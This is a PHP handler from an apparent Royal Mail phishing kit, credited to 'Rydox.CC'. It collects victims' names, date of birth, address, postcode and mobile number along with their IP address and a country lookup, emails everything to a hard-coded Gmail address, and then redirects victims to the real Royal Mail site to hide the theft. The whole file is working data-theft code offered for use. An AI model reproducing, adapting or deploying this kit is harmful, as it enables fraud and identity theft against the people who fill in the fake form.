<?php
// Rydox.CC Coding.
// www.rydox.cc
// Telegram : @RydoxTm
// ICQ : @Rydox

$recipient = 'arbenkeci18@gmail.com'; // Put your email address herez
$over = 'https://www.royalmail.com/';//website
if(isset($_POST['fname'])){

function visitor_country()
	{
		
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$country = json_decode(curl_exec($ch))->country;
	
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$country = visitor_country();

	$ip = getenv("REMOTE_ADDR");
	
    $message.= "First Name: " . $_POST['fname'] . "\n";
    $message.= "Last Name: " . $_POST['lname'] . "\n";
    $message.= "DOB: " . $_POST['dob'] . "\n";
    $message.= "Address: " . $_POST['address'] . "\n";
    $message.= "City: " . $_POST['city'] . "\n";
    $message.= "ZIP: " . $_POST['zip'] . "\n";
    $message.= "Mobile Number: " . $_POST['mobile'] . "\n";
	$message.= "Client IP      : $ip\n";
	$message.= "Client Country      : $country\n";
	$subject = "Royalmail | True Login: " . $ip . "\n";

	if (mail($recipient, $subject, $message))
		{
			header("Location: index3.php");
		}
	  else
		{
		header("Location: $over?error&id=$pass&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
		
		}
	}else{
        header("Location: index.php");
	}
